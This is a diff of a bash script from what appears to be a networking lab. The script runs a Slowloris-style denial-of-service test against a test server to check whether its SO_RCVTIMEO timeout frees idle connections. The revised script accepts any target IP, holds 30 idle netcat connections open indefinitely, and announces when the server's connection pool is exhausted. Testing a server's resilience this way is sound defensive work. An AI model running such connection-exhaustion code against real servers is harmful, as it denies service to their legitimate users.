@@ -1,5 +1,5 @@
 #!/bin/bash
-# Attack 2: Slowloris Attack
+# Attack 2: Slowloris Attack (Manual Cleanup Version)
 #
 # Purpose:
 #   Test SO_RCVTIMEO timeout mechanism by creating connections that
@@ -12,57 +12,74 @@
 #     blocking new legitimate connections
 #   - server_good: Connections timeout after 5 seconds and are
 #     automatically cleaned up (SO_RCVTIMEO working)
-#
-# Verification:
-#   Monitor child process count over time:
-#   watch -n 1 'pgrep -P <SERVER_PID> | wc -l'
-#   server_good should drop to 0 after ~5 seconds
 
-PORT="${1:-8080}"
-NUM_CONNECTIONS=15
-DURATION=10
+# Accept IP and PORT as arguments
+TARGET_IP="${1:-127.0.0.1}"
+PORT="${2:-8080}"
+NUM_CONNECTIONS=30
 
 echo "=== Attack 2: Slowloris Attack ==="
-echo "Target: localhost:$PORT"
-echo "Connections: $NUM_CONNECTIONS (idle, no data sent)"
-echo "Duration: ${DURATION}s"
+echo "Target: $TARGET_IP:$PORT"
+echo "Attempting to create $NUM_CONNECTIONS idle connections..."
 echo ""
 
-echo "Creating $NUM_CONNECTIONS idle connections..."
-echo "(These connections will NOT send any data)"
-echo ""
+# Check if nc is available
+if ! command -v nc &> /dev/null; then
+    echo "ERROR: netcat (nc) is not installed"
+    echo "Please install it with: sudo apt-get install netcat"
+    exit 1
+fi
 
+SUCCESSFUL=0
+FAILED=0
+
+# Create connections that stay open
 for i in $(seq 1 $NUM_CONNECTIONS); do
-    (nc localhost $PORT &) &
-    NC_PIDS="$NC_PIDS $!"
-    sleep 0.1
+    # Try to create connection
+    (tail -f /dev/null | nc $TARGET_IP $PORT > /dev/null 2>&1) &
+    NC_PID=$!
+    
+    # Wait a bit to see if connection succeeds
+    sleep 0.2
+    
+    # Check if the nc process is still running
+    if ps -p $NC_PID > /dev/null 2>&1; then
+        echo "[$i] ✅ Connection established (PID: $NC_PID)"
+        SUCCESSFUL=$((SUCCESSFUL + 1))
+    else
+        echo "[$i] ❌ Connection FAILED - Server may be full or unreachable"
+        FAILED=$((FAILED + 1))
+    fi
 done
 
-echo "Idle connections established."
 echo ""
-echo "Expected behavior:"
-echo "  - server_bad: Child processes persist indefinitely"
-echo "  - server_good: Child processes timeout after ~5 seconds"
+echo "=== Attack Summary ==="
+echo "Successful connections: $SUCCESSFUL"
+echo "Failed connections: $FAILED"
 echo ""
-echo "Monitor child process count with:"
-echo "  pgrep -P \$(pgrep -f 'server_(good|bad) $PORT') | wc -l"
-echo ""
-echo "Waiting ${DURATION} seconds..."
 
-for i in $(seq 1 $DURATION); do
-    echo -n "."
+if [ $FAILED -gt 0 ]; then
+    echo "⚠️  ATTACK SUCCESS: Server connection pool is EXHAUSTED!"
+    echo "   Server cannot accept new connections (DoS condition achieved)"
+    echo ""
+fi
+
+echo "Monitoring instructions:"
+echo "  1. Check established connections:"
+echo "     netstat -an | grep $PORT | grep ESTABLISHED | wc -l"
+echo ""
+echo "  2. Check server child processes:"
+echo "     pgrep -P \$(pgrep -f 'server_(good|bad) $PORT') | wc -l"
+echo ""
+echo "  3. Try connecting a legitimate client:"
+echo "     ./build/client $TARGET_IP $PORT"
+echo ""
+echo "To cleanup connections manually, run:"
+echo "  killall -9 nc tail"
+echo ""
+echo "Press Ctrl+C to exit (connections will remain open)"
+
+# Keep script running
+while true; do
     sleep 1
 done
-echo ""
-echo ""
-
-echo "Cleaning up idle connections..."
-for pid in $NC_PIDS; do
-    kill -9 $pid 2>/dev/null
-done
-
-echo ""
-echo "Attack complete."
-echo ""
-echo "For server_good, idle connections should have been cleaned up"
-echo "automatically after 5s (SO_RCVTIMEO timeout)."
